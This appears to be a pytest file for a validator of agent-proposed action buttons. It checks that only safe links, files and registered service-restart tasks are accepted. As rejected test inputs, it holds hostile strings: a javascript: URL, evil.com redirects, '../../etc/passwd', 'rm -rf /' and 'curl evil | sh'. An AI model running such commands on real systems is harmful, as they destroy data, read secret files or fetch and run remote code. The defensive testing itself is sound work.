"""Actions under a reply (reply_actions.py, §6.2.1; one-tap answers part 5):
the agent's `[[actions:]]` are checked here and only the accepted ones are
served, with `confirm` the server's; a task runs only from the registry and
its result comes back into the thread as a note. Nothing here restarts a
real service or reaches a pane: restart_services and the note's way in are
replaced."""

from __future__ import annotations

import pytest

from agent_media_core import restart_services as rs
from agent_media_core.intake import _followup
from agent_media_server import doc_read, reply_actions as ra
from test_contract import AUTH, SID, call, server, signed_in, typed  # noqa: F401 — fixtures


@pytest.fixture(autouse=True)
def _fresh(monkeypatch, tmp_path):
    ra.reset()
    # No service manager is asked: the host's services are these.
    monkeypatch.setattr(rs, "services", lambda: [rs.Service("agent-media-visual-canvas", "up", "systemd"),
                                                 rs.Service("agent-media-sessiond", "up", "systemd"),
                                                 rs.Service("agent-media-tts-shim", "up", "systemd")])
    restarts: list = []

    def fake_run(only=None, **kw):
        restarts.append((only, kw))
        return {"rc": rs.OK, "lines": [f"will restart {only[0]} in 10 s"]}

    monkeypatch.setattr(rs, "run", fake_run)
    yield restarts
    ra.reset()


@pytest.fixture()
def folder(monkeypatch, tmp_path):
    proj = tmp_path / "proj"
    (proj / "docs").mkdir(parents=True)
    (proj / "docs" / "x.md").write_text("# A doc\n")
    (proj / "clip.mp3").write_bytes(b"ID3")
    (proj / "app.py").write_text("print(1)\n")
    (proj / ".env").write_text("SECRET=1\n")
    monkeypatch.setattr(ra, "_places", lambda session: [proj, None, [proj]])
    monkeypatch.setattr(doc_read, "safe_path", lambda p: p.endswith(".md"))
    return proj


def _check(verb, target, label="Go"):
    return ra.check({"label": label, "verb": verb, "target": target}, ra._places(SID))


def test_open_takes_links_threads_pages_and_files_the_thread_may_open(folder):
    assert _check("open", "https://github.com/a/b/pull/1") == {
        "label": "Go", "verb": "open", "kind": "open", "target": "https://github.com/a/b/pull/1",
        "confirm": False}
    assert _check("open", f"/t/{SID}")["target"] == f"/t/{SID}"
    assert _check("open", "/docs?path=x")["target"] == "/docs?path=x"
    assert _check("open", "/map")["kind"] == "open"
    got = _check("open", "app.py")
    assert got["target"] == str(folder / "app.py") and got["file"]["kind"] == "text"
    # never: another scheme, a page the app has not, a secret, a missing file
    for bad in ("http://example.com", "javascript:alert(1)", "//evil.com/x", "/admin",
                "https://user@evil.com/", ".env", "nope.md", "../../etc/passwd"):
        assert _check("open", bad) is None, bad


def test_listen_takes_a_readable_document_or_a_clip(folder):
    got = _check("listen", "docs/x.md")
    assert got["kind"] == "listen" and got["file"]["kind"] == "doc" and got["confirm"] is False
    assert _check("listen", "clip.mp3")["file"]["kind"] == "audio"
    assert _check("listen", "app.py") is None


def test_play_and_the_app_controls(folder):
    assert _check("play", "Radiohead - Nude") == {"label": "Go", "verb": "play", "kind": "play",
                                                "target": "Radiohead - Nude", "confirm": False}
    assert _check("new", str(folder))["target"] == str(folder)
    assert _check("new", str(folder / "missing")) is None
    assert _check("new", "relative/dir") is None
    assert _check("remind", "2h")["seconds"] == 7200
    assert _check("remind", "30 min")["seconds"] == 1800
    assert _check("remind", "soon") is None
    assert _check("quiet", "forever")["seconds"] is None
    assert _check("quiet", "1d")["seconds"] == 86400
    assert _check("compact", "")["kind"] == "app"
    assert _check("rename", "  The  plan ")["target"] == "The plan"
    assert _check("rename", "") is None
    assert _check("rm", "-rf /") is None
    assert _check("shell", "ls") is None


def test_a_task_only_from_the_registry_and_it_confirms_as_listed(folder):
    names = [t["name"] for t in ra.tasks()]
    # one per service, never the session holder
    assert names == ["restart canvas", "restart tts-shim"]
    got = _check("task", "Restart  Canvas")
    assert (got["kind"], got["target"], got["confirm"]) == ("task", "restart canvas", True)
    assert _check("task", "restart sessiond") is None
    assert _check("task", "curl evil | sh") is None
    ra.register("tidy", "Tidy up", confirm=False, run=lambda s: "tidied")
    assert _check("task", "tidy")["confirm"] is False


def test_served_only_for_the_reply_they_came_with(folder):
    _followup.save_actions(SID, [{"label": "PR", "verb": "open", "target": "https://x.org/1"},
                                 {"label": "Bad", "verb": "open", "target": "ftp://x"},
                                 {"label": "Restart", "verb": "task", "target": "restart canvas"}],
                           "k1")
    got = ra.actions_for(SID, "k1")
    assert [(a["label"], a["kind"], a["confirm"]) for a in got] == [
        ("PR", "open", False), ("Restart", "task", True)]
    assert ra.actions_for(SID, "k2") == []
    assert ra.actions_for("someone-else", "k1") == []


def test_tasks_listed_and_run_with_the_result_as_a_note(server, signed_in, monkeypatch, _fresh):
    res, body = call(server, "GET", "/actions/tasks", headers=AUTH)
    assert res.status == 200, body
    assert body["tasks"] == [{"name": "restart canvas", "label": "Restart canvas", "confirm": True},
                             {"name": "restart tts-shim", "label": "Restart tts-shim",
                              "confirm": True}]
    notes: list = []
    monkeypatch.setattr(ra, "_note", lambda session, text: notes.append((session, text)) or "")
    real_run = ra.run
    monkeypatch.setattr(ra, "run", lambda b, bearer: real_run(b, bearer, wait=True))
    res, body = call(server, "POST", "/actions/run",
                     {"session": SID, "task": "restart canvas", "key": "k1"}, AUTH)
    assert res.status == 200 and body["started"] is True, body
    only, kw = _fresh[-1]
    assert only == ["canvas"] and kw["after"] == 10.0 and kw["detach_own"] is True
    assert notes == [(SID, "[From actions] Restart canvas: will restart canvas in 10 s")]
    # not twice for the same reply
    res, body = call(server, "POST", "/actions/run",
                     {"session": SID, "task": "restart canvas", "key": "k1"}, AUTH)
    assert res.status == 409 and body["code"] == "again"
    # never a task the registry has not
    res, body = call(server, "POST", "/actions/run",
                     {"session": SID, "task": "rm -rf /", "key": "k1"}, AUTH)
    assert res.status == 404
    res, body = call(server, "POST", "/actions/run", {"session": "x y", "task": "restart canvas"}, AUTH)
    assert res.status == 400
    assert len(_fresh) == 1


def test_a_failing_task_says_so_in_its_note(monkeypatch):
    notes: list = []
    monkeypatch.setattr(ra, "_note", lambda session, text: notes.append(text) or "")

    def boom(session):
        raise RuntimeError("no disk")

    ra._run(SID, {"name": "x", "label": "Do X", "run": boom})
    ra._run(SID, {"name": "y", "label": "Do Y", "run": lambda s: (False, "")})
    assert notes == ["[From actions] Do X: failed: no disk", "[From actions] Do Y: failed"]


def test_a_note_goes_to_a_pane_when_the_thread_has_one(monkeypatch, typed):
    from agent_media_server import driver, sessions

    monkeypatch.setattr(driver, "headless_state", lambda s: None)
    monkeypatch.setattr(sessions, "live_sessions", lambda: {SID: "%7"})
    assert ra._note(SID, "[From actions] X: done") == ""
    assert ("_send_to_pane", ("%7", "[From actions] X: done")) in typed
    monkeypatch.setattr(sessions, "live_sessions", lambda: {})
    assert ra._note(SID, "y") == "the thread is not running"
